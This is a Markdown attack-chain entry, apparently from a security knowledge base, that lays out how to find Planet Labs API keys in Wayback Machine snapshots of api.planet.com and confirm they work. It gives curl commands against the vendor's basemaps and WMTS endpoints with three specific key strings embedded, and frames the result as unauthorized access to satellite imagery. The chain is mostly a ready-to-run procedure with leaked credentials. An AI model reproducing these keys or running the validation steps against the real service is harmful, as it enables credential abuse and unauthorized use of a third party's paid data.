---
id: ac-planet-api-leak-wayback
tags:
  - api-key-leak
  - information-disclosure
  - wayback-machine
  - unauthorized-access
  - satellite-data
type: attack_chain
tools:
  - '[[tools/Wayback-Machine]]'
tactics:
  - '[[Reconnaissance]]'
  - '[[Credential Access]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-Wayback-Machine-Snapshots]]'
  - '[[procedures/Extract-and-Validate-Exposed-API-Keys]]'
step_count: 2
techniques:
  - '[[Search Open Websites-Domains]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:39.354Z'
description: >-
  An information disclosure attack exploiting historical web archives to uncover
  and validate exposed API keys for unauthorized access to satellite imagery and
  basemaps.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Credential Access]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Search Open Websites-Domains]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
---
# Planet Labs API Key Exposure via Wayback Machine Archives Leading to Unauthorized Data Access

Multi-stage attack chain demonstrating how attackers can discover and exploit exposed API keys from historical web snapshots to gain unauthorized access to sensitive satellite data resources.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Access Archives] --> B[Credential Access: Extract and Test Keys]
    B --> C[Initial Access: Unauthorized API Usage]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Wayback-Machine]]

### Target Environment

- Web platform with archived historical snapshots
- Internet access to web.archive.org
- No specific ports or services required beyond standard HTTP/HTTPS

### Initial Access Requirements

- Public internet access
- No prior credentials needed
- Basic knowledge of URL navigation and API testing

## Detailed Attack Procedures

### Step 1: Access Historical Snapshots
procedure: [[procedures/Access-Wayback-Machine-Snapshots]]

**Objective**: Locate and view cached historical versions of the target API endpoint to identify potential data exposures.

**Instructions**: Navigate to the Wayback Machine calendar view for the target domain using [[commands/wayback-url-navigate]]:

```bash
# No command needed; use browser to visit https://web.archive.org/web/*/https://api.planet.com/
```

Select a snapshot date from the calendar interface to load the archived page.

**Expected Output**: A list of capture dates and links to historical snapshots of https://api.planet.com/.

**Success Indicators**:
- Calendar loads with multiple capture points
- Snapshots display original API endpoint content including potential embedded keys

### Step 2: Extract and Validate API Keys
procedure: [[procedures/Extract-and-Validate-Exposed-API-Keys]]

**Objective**: Identify API keys from archived content and test their validity to enable unauthorized access to resources like basemaps and mosaics.

**Instructions**: Manually inspect snapshot pages for embedded API keys in URLs or parameters. Then test validity using [[commands/curl-api-key-test]]:

```bash
curl "https://api.planet.com/basemaps/v1/mosaics?api_key=afdb1e8a9c8142739553e3942283d6c8&_page_size=1000"
```

For WMTS endpoints:

```bash
curl "https://api.planet.com/basemaps/v1/mosaics/wmts?service=wmts&request=GetCapabilities&format=text%2Fxml&api_key=8fe044edc78c46ba904bb62e550493a3"
```

Compare against invalid keys to confirm:

```bash
curl "https://api.planet.com/basemaps/v1/mosaics?api_key=f366791cb438466fb9e3e492e721da8d&_page_size=1000"
```

**Expected Output**: Successful responses (e.g., JSON data or XML capabilities) for valid keys; 401/403 errors for invalid ones.

**Success Indicators**:
- Valid keys return API data without authentication prompts
- Access to basemaps, mosaics, or satellite imagery confirmed

## Attack Chain Summary

### Key Achievements

1. Discovered exposed API keys in public archives without direct system access
2. Validated keys for ongoing unauthorized access to sensitive satellite resources
3. Demonstrated low-effort reconnaissance leading to high-impact data exfiltration potential

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Search Open Websites-Domains]] Search Open Websites and Domains
- [[Unsecured Credentials]] Unprotected Credentials
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance
- [[Credential Access]] Credential Access
- [[Initial Access]] Initial Access

---
*Last updated: 2023-10-01T00:00:00Z*
